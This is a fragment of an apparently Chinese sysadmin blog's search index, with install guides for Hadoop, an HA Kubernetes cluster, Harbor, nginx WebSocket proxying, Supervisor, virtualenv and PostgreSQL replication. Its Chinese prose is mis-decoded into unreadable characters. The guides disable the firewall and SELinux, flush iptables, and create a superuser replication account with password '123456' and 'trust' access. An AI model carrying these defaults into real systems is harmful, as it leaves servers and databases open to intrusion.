10:19","objectID":"/post/1876/:0:3","tags":["hadoop"],"title":"hadoop3.2.1ä¼ªåˆ†å¸ƒå¼æ¨¡å¼å®‰è£…","uri":"/post/1876/"},{"categories":["hadoop"],"content":"4.è®¾ç½®ä¸»æœºåï¼Œé…ç½®hostsè§£æ hostnamectl set-hostname hadoop echo '127.0.0.1 hadoop' \u003e\u003e /etc/hosts ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:4","tags":["hadoop"],"title":"hadoop3.2.1ä¼ªåˆ†å¸ƒå¼æ¨¡å¼å®‰è£…","uri":"/post/1876/"},{"categories":["hadoop"],"content":"5.é…ç½®å…å¯†é€šä¿¡ su hadoop ssh-keygen -t rsa -f ~/.ssh/id_rsa -P '' cat ~/.ssh/id_rsa.pub \u003e\u003e ~/.ssh/authorized_keys chmod 600 ~/.ssh/authorized_keys ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:5","tags":["hadoop"],"title":"hadoop3.2.1ä¼ªåˆ†å¸ƒå¼æ¨¡å¼å®‰è£…","uri":"/post/1876/"},{"categories":["hadoop"],"content":"5.ä¿®æ”¹hadoopé…ç½® su hadoop vim /usr/local/hadoop/etc/hadoop/hadoop-env.sh export JAVA_HOME=/usr/local/jdk vim /usr/local/hadoop/etc/hadoop/core-site.xml: \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003efs.defaultFS\u003c/name\u003e \u003cvalue\u003ehdfs://hadoop:9000\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e vim /usr/local/hadoop/etc/hadoop/hdfs-site.xml \u003cconfiguration\u003e \u003cproperty\u003e \u003cname\u003edfs.replication\u003c/name\u003e \u003cvalue\u003e1\u003c/value\u003e \u003c/property\u003e \u003c/configuration\u003e ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:6","tags":["hadoop"],"title":"hadoop3.2.1ä¼ªåˆ†å¸ƒå¼æ¨¡å¼å®‰è£…","uri":"/post/1876/"},{"categories":["hadoop"],"content":"6.åœ¨æœ¬åœ°è¿è¡ŒMapReduceä»»åŠ¡ 6.1 æ ¼å¼åŒ–æ–‡ä»¶ç³»ç»Ÿ hdfs namenode -format 6.2 å¯åŠ¨NameNodeå®ˆæŠ¤ç¨‹åºå’ŒDataNodeå®ˆæŠ¤ç¨‹åºï¼š /usr/local/hadoop/sbin/start-dfs.sh å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®éªŒè¯ï¼šhttp://xx.xx.xx.xx:9870 6.3 åˆ›å»ºhdfsç›®å½• su hadoop hdfs dfs -mkdir /user bin/hdfs dfs -mkdir /user/hadoop 6.4 å°†input fileå¤åˆ¶åˆ°åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿhdfs hdfs dfs -mkdir input hdfs dfs -put etc/hadoop/*.xml input 6.5 è¿è¡Œä¸€ä¸ªç¤ºä¾‹ hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.2.1.jar grep input output 'dfs[a-z.]+' 6.6 æ£€æŸ¥è¾“å‡ºæ–‡ä»¶ï¼šå°†è¾“å‡ºæ–‡ä»¶ä»åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿhdfså¤åˆ¶åˆ°æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿå¹¶æ£€æŸ¥å®ƒä»¬ï¼š hdfs dfs -get output output cat output/* ","date":"2020-07-13 10:19","objectID":"/post/1876/:0:7","tags":["hadoop"],"title":"hadoop3.2.1ä¼ªåˆ†å¸ƒå¼æ¨¡å¼å®‰è£…","uri":"/post/1876/"},{"categories":["kubernetes"],"content":"1.hostè§£æ cat \u003e\u003e /etc/hosts \u003c\u003cEOF 10.0.0.10 k8s-master01 10.0.0.11 k8s-master02 10.0.0.12 k8s-master03 10.0.0.5 k8s-master EOF 2.å®‰è£…ä¾èµ–åŒ… yum install -y epel-release conntrack ntpdate ntp ipvsadm ipset jq iptables curl sysstat libseccomp wget unzip net-tools 3.å…³é—­é˜²ç«å¢™ systemctl stop firewalld systemctl disable firewalld iptables -F \u0026\u0026 iptables -X \u0026\u0026 iptables -F -t nat \u0026\u0026 iptables -X -t nat iptables -P FORWARD ACCEPT 4.å…³é—­selinux setenforce 0 sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config 5.ä¼˜åŒ–å†…æ ¸å‚æ•° modprobe br_netfilter cat \u003e kubernetes.conf \u003c\u003cEOF net.bridge.bridge-nf-call-iptables=1 net.bridge.bridge-nf-call-ip6tables=1 net.ipv4.ip_forward=1 net.ipv4.tcp_tw_recycle=0 net.ipv4.neigh.default.gc_thresh1=1024 net.ipv4.neigh.default.gc_thresh2=2048 net.ipv4.neigh.default.gc_thresh3=4096 vm.swappiness=0 # ç¦æ­¢ä½¿ç”¨ swap ç©ºé—´ï¼Œåªæœ‰å½“ç³»ç»Ÿ OOM æ—¶æ‰å…è®¸ä½¿ç”¨å®ƒ vm.overcommit_memory=1 # ä¸æ£€æŸ¥ç‰©ç†å†…å­˜æ˜¯å¦å¤Ÿç”¨ vm.panic_on_oom=0 # å¼€å¯ OOM fs.inotify.max_user_instances=8192 fs.inotify.max_user_watches=1048576 fs.file-max=52706963 fs.nr_open=52706963 net.ipv6.conf.all.disable_ipv6=1 net.netfilter.nf_conntrack_max=2310720 EOF cp kubernetes.conf /etc/sysctl.d/kubernetes.conf sysctl -p /etc/sysctl.d/kubernetes.conf ipvsé…ç½® modprobe ip_vs_rr cat \u003e /etc/sysconfig/modules/ipvs.modules \u003c\u003cEOF #!/bin/bash modprobe -- ip_vs modprobe -- ip_vs_rr modprobe -- ip_vs_wrr modprobe -- ip_vs_sh modprobe -- nf_conntrack_ipv4 EOF chmod 755 /etc/sysconfig/modules/ipvs.modules \u0026\u0026 bash /etc/sysconfig/modules/ipvs.modules \u0026\u0026 lsmod | grep -e ip_vs -e nf_conntrack_ipv4 6.å®‰è£…keepalived yum install -y keepalived 7.é…ç½®keepalived,å¦å¤–ä¸¤å°ä¹Ÿéœ€è¦é…ç½®ï¼Œéœ€è¦ä¿®æ”¹router_idã€ cat \u003e /etc/keepalived/keepalived.conf \u003c\u003c EOF global_defs { router_id k8s-master01 } vrrp_script check_haproxy { #æ ¹æ®è¿›ç¨‹åç§°æ£€æµ‹è¿›ç¨‹æ˜¯å¦å­˜åœ¨ script \"killall -0 haproxy\" #æ¯3ç§’æ£€æŸ¥ä¸€æ¬¡ interval 3 #æ£€æµ‹å¤±è´¥ä¼šå‡å°‘2çš„æƒå€¼ weight -2 #10æ¬¡æ£€æµ‹å¤±è´¥æ‰ä¸ºå¤±è´¥çŠ¶æ€ fall 10 #2æ¬¡æ£€æµ‹æˆåŠŸæ‰ä¸ºæ­£å¸¸çŠ¶æ€ rise 2 } vrrp_instance VI_1 { state BACKUP interface eth0 virtual_router_id 51 priority 100 advert_int 1 authentication { auth_type PASS auth_pass soulchild } virtual_ipaddress { 10.0.0.5 } track_script { check_haproxy } } EOF å¯åŠ¨ systemctl enable keepalived \u0026\u0026 systemctl start keepalived 8.å®‰è£…é…ç½®haproxy yum install -y haproxy cat \u003e /etc/haproxy/haproxy.cfg \u003c\u003c EOF #--------------------------------------------------------------------- # Global settings #--------------------------------------------------------------------- global # to have these messages end up in /var/log/haproxy.log you will # need to: # 1) configure syslog to accept network log events. This is done # by adding the '-r' option to the SYSLOGD_OPTIONS in # /etc/sysconfig/syslog # 2) configure local2 events to go to the /var/log/haproxy.log # file. A line like the following can be added to # /etc/sysconfig/syslog # # local2.* /var/log/haproxy.log # log 127.0.0.1 local2 chroot /var/lib/haproxy pidfile /var/run/haproxy.pid maxconn 4000 user haproxy group haproxy daemon # turn on stats unix socket stats socket /var/lib/haproxy/stats #--------------------------------------------------------------------- # common defaults that all the 'listen' and 'backend' sections will # use if not designated in their block #--------------------------------------------------------------------- defaults mode http log global option httplog option dontlognull option http-server-close option forwardfor except 127.0.0.0/8 option redispatch retries 3 timeout http-request 10s timeout queue 1m timeout connect 10s timeout client 1m timeout server 1m timeout http-keep-alive 10s timeout check 10s maxconn 3000 #--------------------------------------------------------------------- # kubernetes apiserver frontend which proxys to the backends #--------------------------------------------------------------------- frontend kubernetes-apiserver mode tcp bind *:8443 option tcplog default_backend kubernetes-apiserver #--------------------------------------------------------------------- # round robin balancing between the various backends #------------------------------------------------------------","date":"2020-07-10 13:11","objectID":"/post/1875/:0:0","tags":["k8s"],"title":"kubeadmå †å æ–¹æ¡ˆéƒ¨ç½²k8sé«˜å¯ç”¨é›†ç¾¤","uri":"/post/1875/"},{"categories":["docker","kubernetes"],"content":"ä¸€ã€ä¸‹è½½å®‰è£…åŒ… wget https://github.com/goharbor/harbor/releases/download/v2.0.1/harbor-online-installer-v2.0.1.tgz ","date":"2020-07-07 08:59","objectID":"/post/1874/:1:0","tags":["docker","k8s"],"title":"harbor2.0.1å®‰è£…éƒ¨ç½²","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"äºŒã€è§£å‹ tar xf harbor-online-installer-v2.0.1.tgz -C /usr/local/ ","date":"2020-07-07 08:59","objectID":"/post/1874/:2:0","tags":["docker","k8s"],"title":"harbor2.0.1å®‰è£…éƒ¨ç½²","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"ä¸‰ã€é…ç½®httpsè®¿é—® 1.åˆ›å»ºç›®å½• mkdir /data/harbor/cert -p cd /data/harbor/cert ","date":"2020-07-07 08:59","objectID":"/post/1874/:3:0","tags":["docker","k8s"],"title":"harbor2.0.1å®‰è£…éƒ¨ç½²","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"é…ç½®è¯ä¹¦é¢å‘æœºæ„ 1.ç”ŸæˆCAè¯ä¹¦ç§é’¥ openssl genrsa -out ca.key 4096 2.ç”ŸæˆCAè¯ä¹¦ openssl req -x509 -new -nodes -sha512 -days 3650 \\ -subj \"/C=CN/ST=Shanghai/L=Shanghai/O=soulchild/OU=myharbor/CN=registry.com\" \\ -key ca.key \\ -out ca.crt å­—æ®µå«ä¹‰ï¼š C:å›½å®¶ ST:çœä»½ L:åŸå¸‚ O:ç»„ç»‡å•ä½ OU:å…¶ä»–å†…å®¹ CN:ä¸€èˆ¬å¡«å†™åŸŸå ","date":"2020-07-07 08:59","objectID":"/post/1874/:3:1","tags":["docker","k8s"],"title":"harbor2.0.1å®‰è£…éƒ¨ç½²","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"é…ç½®æœåŠ¡å™¨è¯ä¹¦ ç”Ÿæˆç§é’¥ openssl genrsa -out registry.com.key 4096 2.ç”Ÿæˆè¯ä¹¦ç­¾åè¯·æ±‚ï¼ˆCSRï¼‰ openssl req -sha512 -new \\ -subj \"/C=CN/ST=Shanghai/L=Shanghai/O=soulchild/OU=myharbor/CN=registry.com\" \\ -key registry.com.key \\ -out registry.com.csr ç”Ÿæˆx509 v3æ‰©å±•æ–‡ä»¶ cat \u003e v3.ext \u003c\u003c-EOF authorityKeyIdentifier=keyid,issuer basicConstraints=CA:FALSE keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] DNS.1=registry.com DNS.2=registry DNS.3=harbor EOF 4.ä½¿ç”¨v3.extæ–‡ä»¶ä¸ºHarborä¸»æœºç”Ÿæˆè¯ä¹¦ openssl x509 -req -sha512 -days 3650 \\ -extfile v3.ext \\ -CA ca.crt -CAkey ca.key -CAcreateserial \\ -in registry.com.csr \\ -out registry.com.crt ","date":"2020-07-07 08:59","objectID":"/post/1874/:3:2","tags":["docker","k8s"],"title":"harbor2.0.1å®‰è£…éƒ¨ç½²","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"æä¾›è¯ä¹¦ç»™Harborå’ŒDocker openssl x509 -inform PEM -in registry.com.crt -out registry.com.cert mkdir -p /etc/docker/certs.d/registry.com/ cp /data/harbor/cert/registry.com.crt /etc/docker/certs.d/registry.com/ ","date":"2020-07-07 08:59","objectID":"/post/1874/:3:3","tags":["docker","k8s"],"title":"harbor2.0.1å®‰è£…éƒ¨ç½²","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"å››ã€é…ç½®harbor ä¿®æ”¹å¦‚ä¸‹é…ç½® hostname: registry.com https: # https port for harbor, default is 443 port: 443 # The path of cert and key files for nginx certificate: /data/harbor/cert/registry.com.crt private_key: /data/harbor/cert/registry.com.key data_volume: /data/harbor ","date":"2020-07-07 08:59","objectID":"/post/1874/:4:0","tags":["docker","k8s"],"title":"harbor2.0.1å®‰è£…éƒ¨ç½²","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"äº”ã€å®‰è£…harbor cd harbor/ ./install.sh ","date":"2020-07-07 08:59","objectID":"/post/1874/:5:0","tags":["docker","k8s"],"title":"harbor2.0.1å®‰è£…éƒ¨ç½²","uri":"/post/1874/"},{"categories":["docker","kubernetes"],"content":"å…­ã€è®¿é—® æ·»åŠ è§£æï¼Œä¿®æ”¹hosts 10.0.0.50 registry.com æ‰“å¼€è®¿é—®ï¼šhttps://registry.com/ ","date":"2020-07-07 08:59","objectID":"/post/1874/:6:0","tags":["docker","k8s"],"title":"harbor2.0.1å®‰è£…éƒ¨ç½²","uri":"/post/1874/"},{"categories":["kubernetes"],"content":" apiVersion: v1 kind: Service metadata: labels: app: gateway name: gateway namespace: {nameSpace} spec: ports: - name: gateway port: 80 protocol: TCP targetPort: http selector: app: gateway type: ClusterIP --- apiVersion: apps/v1 kind: Deployment metadata: name: gateway namespace: {nameSpace} spec: replicas: {replicas} selector: matchLabels: app: gateway template: metadata: labels: app: gateway spec: imagePullSecrets: - name: registry-secret containers: - name: gateway resources: requests: cpu: {request_cpu} memory: {request_memory} limits: cpu: {limit_cpu} memory: {limit_memory} image: {imageName} ports: - containerPort: 80 name: http env: - name: JAVA_OPTS value: \"-XX:+UnlockExperimentalVMOptions -XX:+UseCGroupMemoryLimitForHeap -XX:MinRAMPercentage=70.0 -XX:MaxRAMPercentage=80.0 -XX:+HeapDumpOnOutOfMemoryError\" command: [\"/bin/sh\"] args: [\"-c\",\"java $JAVA_OPTS -Dspring.profiles.active={deployEnv} -Djava.security.egd=file:/dev/./urandom -jar /gateway.jar\"] readinessProbe: httpGet: path: /actuator/info port: http scheme: HTTP initialDelaySeconds: 30 periodSeconds: 30 failureThreshold: 5 successThreshold: 1 timeoutSeconds: 30 livenessProbe: httpGet: path: /actuator/info port: http scheme: HTTP initialDelaySeconds: 60 periodSeconds: 30 failureThreshold: 3 successThreshold: 1 timeoutSeconds: 30 --- apiVersion: networking.k8s.io/v1beta1 kind: Ingress metadata: name: gateway namespace: {nameSpace} annotations: kubernetes.io/ingress.class: \"nginx\" nginx.ingress.kubernetes.io/use-regex: \"true\" spec: rules: - host: {domainName} http: paths: - backend: serviceName: gateway servicePort: gateway ","date":"2020-07-06 16:00","objectID":"/post/1871/:0:0","tags":["k8s"],"title":"yamlæ¨¡æ¿","uri":"/post/1871/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"è¦å°†å®¢æˆ·æœºå’ŒæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ä»HTTP/1.1è½¬æ¢ä¸ºWebSocketï¼Œéœ€è¦ä½¿ç”¨HTTP/1.1ä¸­æä¾›çš„åè®®äº¤æ¢æœºåˆ¶ã€‚ ä½†æ˜¯æœ‰ä¸€ä¸ªå¾®å¦™ä¹‹å¤„ï¼šç”±äºâ€œUpgradeâ€æ˜¯ä¸€ä¸ªé€è·³çš„æŠ¥å¤´ï¼Œå®ƒä¸ä¼šä»å®¢æˆ·ç«¯ä¼ é€’åˆ°ä»£ç†æœåŠ¡å™¨ã€‚é€šè¿‡æ­£å‘ä»£ç†ï¼Œå®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨CONNECTæ–¹æ³•æ¥é¿å…è¿™ä¸ªé—®é¢˜ã€‚ä½†æ˜¯è¿™ä¸é€‚ç”¨äºåå‘ä»£ç†ï¼Œå› ä¸ºå®¢æˆ·ç«¯ä¸çŸ¥é“ä»»ä½•ä»£ç†æœåŠ¡å™¨ï¼Œå¹¶ä¸”éœ€è¦åœ¨ä»£ç†æœåŠ¡å™¨ä¸Šè¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚ ä»ç‰ˆæœ¬1.3.13å¼€å§‹,nginxå®ç°äº†ä¸€ç§ç‰¹æ®Šçš„æ“ä½œæ¨¡å¼ï¼Œå¦‚æœä»£ç†æœåŠ¡å™¨è¿”å›ä»£ç ä¸º101ï¼ˆäº¤æ¢åè®®ï¼‰çš„å“åº”,å¹¶ä¸”å®¢æˆ·ç«¯é€šè¿‡è¯·æ±‚ä¸­çš„â€œUpgradeâ€æŠ¥å¤´è¯·æ±‚åè®®äº¤æ¢ï¼Œåˆ™å…è®¸åœ¨å®¢æˆ·ç«¯å’Œä»£ç†æœåŠ¡å™¨ä¹‹é—´å»ºç«‹éš§é“ã€‚ å¦‚ä¸Šæ‰€è¿°ï¼ŒåŒ…æ‹¬â€œUpgradeâ€å’Œâ€œConnectionâ€åœ¨å†…çš„é€è·³æŠ¥å¤´ä¸ä¼šä»å®¢æˆ·ç«¯ä¼ é€’åˆ°ä»£ç†æœåŠ¡å™¨ï¼Œå› æ­¤ï¼Œä¸ºäº†è®©è¢«ä»£ç†æœåŠ¡å™¨çŸ¥é“å®¢æˆ·ç«¯å°†åè®®åˆ‡æ¢åˆ°WebSocketçš„æ„å›¾ï¼Œå¿…é¡»ä¼ é€’è¿™äº›æŠ¥å¤´ï¼š location /chat/ { proxy_pass http://backend; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"upgrade\"; } ä¸€ä¸ªæ›´å¤æ‚çš„ç¤ºä¾‹ï¼Œå…¶ä¸­å‘é€åˆ°ä»£ç†æœåŠ¡å™¨çš„è¯·æ±‚ä¸­â€œConnectionâ€è¯·æ±‚å¤´çš„å€¼å–å†³äºå®¢æˆ·ç«¯è¯·æ±‚å¤´ä¸­æ˜¯å¦å­˜åœ¨â€œUpgradeâ€å­—æ®µï¼š http { map $http_upgrade $connection_upgrade { default upgrade; '' close; } server { ... location /chat/ { proxy_pass http://backend; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $connection_upgrade; } } ","date":"2020-07-03 09:10","objectID":"/post/1866/:0:0","tags":["nginx"],"title":"nginxé…ç½®Websocketåå‘ä»£ç†","uri":"/post/1866/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å®‰è£… yum install -y supervisor ","date":"2020-07-02 15:04","objectID":"/post/1865/:1:0","tags":["supervisor"],"title":"Supervisorå®‰è£…å’Œç®€å•ä½¿ç”¨","uri":"/post/1865/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"é…ç½® é…ç½®æ¨¡æ¿ [program:ä½ çš„åº”ç”¨åç§°] command=/bin/cat ; å¯åŠ¨å‘½ä»¤ process_name=%(program_name)s_%(process_num)02d ; å¯åŠ¨å¤šä¸ªå‰¯æœ¬æ—¶ï¼ŒæŒ‡å®šä¸åŒçš„è¿›ç¨‹çš„åç§° numprocs=1 ; è¦å¯åŠ¨çš„å‰¯æœ¬æ•°é‡ directory=/tmp ; åœ¨æŒ‡å®šçš„ç›®å½•æ‰§è¡Œç¨‹åº priority=999 ; å¯åŠ¨ä¼˜å…ˆçº§ (é»˜è®¤: 999) autostart=true ; è‡ªåŠ¨å¯åŠ¨ (é»˜è®¤: true) autorestart=true ; æ„å¤–é€€å‡ºæ—¶é‡æ–°å¯åŠ¨ (é»˜è®¤: true) startsecs=10 ; è¿è¡Œ10ç§’åæ²¡æœ‰å¼‚å¸¸é€€å‡ºï¼Œå°±ä»£è¡¨æ­£å¸¸è¿è¡Œ startretries=3 ; å¯åŠ¨å¤±è´¥é‡æ–°å°è¯•å¯åŠ¨çš„æ¬¡æ•° (é»˜è®¤: 3) exitcodes=0,2 ; è¿›ç¨‹æ­£å¸¸é€€å‡ºçš„çŠ¶æ€ç  (é»˜è®¤: 0,2) stopsignal=QUIT ; ç»ˆæ­¢è¿›ç¨‹çš„æ–¹å¼ (é»˜è®¤: TERM) user=chrism ; ç”¨æŒ‡å®šçš„ç”¨æˆ·å¯åŠ¨ redirect_stderr=true ; å°†è¿›ç¨‹çš„stderré‡å®šå‘åˆ°stdoutï¼ˆé»˜è®¤: falseï¼‰ stdout_logfile=/a/path ; stdoutæ—¥å¿—è·¯å¾„ stdout_logfile_maxbytes=1MB ; stdoutå•ä¸ªæ—¥å¿—å¤§å°ï¼Œæ»¡è¶³åè½®è½¬(é»˜è®¤ 50M) stdout_logfile_backups=10 ; stdoutæ—¥å¿—æ–‡ä»¶å¤‡ä»½æ•° (é»˜è®¤ 10) stderr_logfile=/a/path ; stderræ—¥å¿—è·¯å¾„ stderr_logfile_maxbytes=1MB ; stderrå•ä¸ªæ—¥å¿—å¤§å°ï¼Œæ»¡è¶³åè½®è½¬(é»˜è®¤ 50M) stderr_logfile_backups=10 ; stderræ—¥å¿—æ–‡ä»¶å¤‡ä»½æ•° (é»˜è®¤ 10) environment=A=1,B=2 ; è®¾ç½®ç¯å¢ƒå˜é‡ å†™ä¸€ä¸ªä¾‹å­ï¼š [program:app] command=/usr/local/python3/bin/python3 app.py directory=/root autostart=true autorestart=true startsecs=10 startretries=3 exitcodes=0,2 stopsignal=QUIT user=root redirect_stderr=true stdout_logfile=/var/log/app.log stdout_logfile_maxbytes=1MB stdout_logfile_backups=10 rootç›®å½•ä¸‹æ”¾ä¸€ä¸ªapp.py import logging logging.basicConfig(format=\"%(asctime)s-%(name)s-%(levelname)s-%(message)s\",level=logging.INFO) log = logging.getLogger('demo') while True: log.error(\"é”™å•¦é”™å•¦\") log.info('æŒºå¥½æŒºå¥½') ","date":"2020-07-02 15:04","objectID":"/post/1865/:2:0","tags":["supervisor"],"title":"Supervisorå®‰è£…å’Œç®€å•ä½¿ç”¨","uri":"/post/1865/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å¯åŠ¨supervisordç¨‹åº systemctl start supervisordæˆ–è€…supervisord -c /etc/supervisord.conf ","date":"2020-07-02 15:04","objectID":"/post/1865/:3:0","tags":["supervisor"],"title":"Supervisorå®‰è£…å’Œç®€å•ä½¿ç”¨","uri":"/post/1865/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"å¸¸ç”¨å‘½ä»¤ # å¯åŠ¨åº”ç”¨ supervisorctl start all # å¯åŠ¨æ‰€æœ‰è¿›ç¨‹ supervisorctl start app # å¯åŠ¨æŒ‡å®šè¿›ç¨‹ supervisorctl start app:* # å¯åŠ¨ä¸€ç»„è¿›ç¨‹ # é‡å¯åº”ç”¨ supervisorctl restart all # é‡å¯æ‰€æœ‰è¿›ç¨‹ supervisorctl restart app # é‡å¯æŒ‡å®šè¿›ç¨‹ supervisorctl restart app:* # é‡å¯ä¸€ç»„è¿›ç¨‹ # åœæ­¢åº”ç”¨ supervisorctl stop all # åœæ­¢æ‰€æœ‰è¿›ç¨‹ supervisorctl stop app # åœæ­¢æŒ‡å®šè¿›ç¨‹ supervisorctl stop app:* # åœæ­¢ä¸€ç»„è¿›ç¨‹ # æŸ¥çœ‹è¢«ç®¡ç†é¡¹ç›®è¿è¡ŒçŠ¶æ€ supervisorctl status # æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹çŠ¶æ€ supervisorctl status app:* # æŸ¥çœ‹ä¸€ç»„è¿›ç¨‹çŠ¶æ€ # é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ supervisorctl update # é‡æ–°åŠ è½½æ‰€æœ‰é…ç½®æ–‡ä»¶ï¼Œå¹¶é‡æ–°è¿è¡Œè¿›ç¨‹ supervisorctl update app # é‡æ–°åŠ è½½æŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œå¹¶é‡æ–°è¿è¡Œè¿›ç¨‹ # é‡æ–°å¯åŠ¨æ‰€æœ‰ç¨‹åº supervisorctl reload # é‡æ–°æ‰€æœ‰è¿›ç¨‹ # æ¸…é™¤æ—¥å¿— supervisorctl clear # æ¸…é™¤æ—¥å¿— supervisorctl clear app # æ¸…é™¤æŒ‡å®šæ—¥å¿— ","date":"2020-07-02 15:04","objectID":"/post/1865/:3:1","tags":["supervisor"],"title":"Supervisorå®‰è£…å’Œç®€å•ä½¿ç”¨","uri":"/post/1865/"},{"categories":["åŸºç¡€å†…å®¹"],"content":"æ£€æŸ¥ tail -f /var/log/app.log ","date":"2020-07-02 15:04","objectID":"/post/1865/:4:0","tags":["supervisor"],"title":"Supervisorå®‰è£…å’Œç®€å•ä½¿ç”¨","uri":"/post/1865/"},{"categories":["python"],"content":"å®‰è£… pip3 install virtualenv virtualenvwrapper é…ç½® vim ~/.bashrc source /usr/local/python3/bin/virtualenvwrapper.sh VIRTUALENVWRAPPER_PYTHON=/usr/local/python3/bin/python3.6 ä½¿ç”¨ #åˆ›å»ºç¯å¢ƒï¼š mkvirtualenv \u003cç¯å¢ƒå\u003e #æŒ‡å®špyç‰ˆæœ¬ mkvirtualenv -p python2 \u003cç¯å¢ƒå\u003e #åˆ é™¤ç¯å¢ƒï¼š rmvirtualenv \u003cç¯å¢ƒå\u003e #åˆ‡æ¢ç¯å¢ƒï¼š workon \u003cç¯å¢ƒå\u003e #é€€å‡ºç¯å¢ƒï¼š deactivate åˆ—å‡ºæ‰€æœ‰ç¯å¢ƒï¼šworkon æˆ–è€… lsvirtualenv é»˜è®¤åˆ›å»ºçš„è™šæ‹Ÿç¯å¢ƒåœ¨~/.virtualenvs/å¯ä»¥ä½¿ç”¨WORKON_HOMEå˜é‡ä¿®æ”¹ ","date":"2020-07-02 11:53","objectID":"/post/1864/:0:0","tags":["python"],"title":"pythonè™šæ‹Ÿç¯å¢ƒvirtualenvå®‰è£…ä½¿ç”¨","uri":"/post/1864/"},{"categories":["databases"],"content":"å‡†å¤‡2å°pgsql ä¸»æœåŠ¡å™¨å®‰è£…å¹¶åˆå§‹åŒ–ï¼Œä»æœåŠ¡å™¨åªå®‰è£…ä¸ç”¨åˆå§‹åŒ– ä¸»æœº IP è§’è‰² pgsql01 10.0.0.72 ä¸» pgsql02 10.0.0.73 ä» ","date":"2020-06-30 08:59","objectID":"/post/1859/:1:0","tags":["postgresql","pgsql"],"title":"pgsql9.4ä¸»å¤‡é…ç½®","uri":"/post/1859/"},{"categories":["databases"],"content":"ä¸»åº“é…ç½® 1.åˆ›å»ºåŒæ­¥ç”¨æˆ· psql -c \"create user replica CREATEDB SUPERUSER LOGIN REPLICATION password '123456';\" 2.ç»™åŒæ­¥ç”¨æˆ·æ·»åŠ è¿æ¥æƒé™ vim /data/pgsql/pg_hba.confæ·»åŠ å¦‚ä¸‹å†…å®¹ host all all 10.0.0.0/24 md5 local replication replica trust host replication replica 10.0.0.0/24 md5 host replication replica ::1/128 trust 3.ä¿®æ”¹ä¸»åº“é…ç½® vim /data/pgsql/postgres.conf # ç›‘å¬åœ°å€ listen_addresses = 'localhost,10.0.0.72' # ä»æœåŠ¡å™¨çš„æœ€å¤§å¹¶å‘è¿æ¥æ•°ï¼ˆå³ï¼ŒåŒæ—¶è¿è¡Œçš„WAL senderè¿›ç¨‹çš„æœ€å¤§æ•°é‡ï¼‰ max_wal_senders = 3 # æµå¤åˆ¶çº§åˆ«å†³å®šæœ‰å¤šå°‘ä¿¡æ¯è¢«å†™å…¥åˆ°WALä¸­ï¼Œé»˜è®¤åªå†™å…¥æœåŠ¡ç«¯å´©æºƒæ—¶æ‰€éœ€ä¿¡æ¯ã€‚ archiveè¡¥å……WALå½’æ¡£éœ€è¦çš„æ—¥å¿—è®°å½•ï¼› hot_standbyè¿›ä¸€æ­¥å¢åŠ åœ¨ä»æœåŠ¡å™¨ä¸Šè¿è¡Œåªè¯»æŸ¥è¯¢æ‰€éœ€çš„ä¿¡æ¯ wal_level = hot_standby # æœåŠ¡å™¨ä¼šåœ¨æ£€æŸ¥ç‚¹åçš„ç¬¬ä¸€æ¬¡ä¿®æ”¹æœŸé—´å°†æ¯ä¸ªç£ç›˜é¡µçš„å…¨éƒ¨å†…å®¹å†™å…¥WALï¼Œå³ä½¿å¯¹äºæ‰€è°“çš„æç¤ºä½çš„éå…³é”®ä¿®æ”¹ä¹Ÿæ˜¯å¦‚æ­¤ã€‚ wal_log_hints = on # æŒ‡å®šåœ¨pg_xlogç›®å½•ä¸‹çš„ä»¥å¾€æ—¥å¿—æ–‡ä»¶æ®µçš„æœ€å°æ•°é‡ wal_keep_segments = 10 # æŒ‡å®šæ¢å¤æœŸé—´æ˜¯å¦å¯ä»¥è¿æ¥å¹¶è¿è¡ŒæŸ¥è¯¢ hot_standby = on 4.é‡å¯ pg_ctl -D /data/pgsql restart -l pgsql.log ","date":"2020-06-30 08:59","objectID":"/post/1859/:2:0","tags":["postgresql","pgsql"],"title":"pgsql9.4ä¸»å¤‡é…ç½®","uri":"/post/1859/"},{"categories":["databases"],"content":"ä»åº“é…ç½® 1.åŸºç¡€å¤‡ä»½ pg_basebackup -h10.0.0.72 -Ureplica -Fp -Xs -v -P -D /data/pgsql/ -R å‚æ•°è¯´æ˜ï¼š -Fpï¼šä½¿ç”¨plain(åŸæ ·è¾“å‡º)æ ¼å¼å¤‡ä»½ -Xsï¼šè¡¨ç¤ºå¤‡ä»½å¼€å§‹åï¼Œå¯åŠ¨å¦ä¸€ä¸ªæµå¤åˆ¶è¿æ¥ä»ä¸»åº“æ¥æ”¶WALæ—¥å¿—. -vï¼šè¾“å‡ºè¯¦ç»†ä¿¡æ¯ -Pï¼šæ˜¾ç¤ºè¿›åº¦ä¿¡æ¯ -Dï¼šå°†åŸºæœ¬å¤‡ä»½æ”¾åˆ°å“ªä¸ªç›®å½• 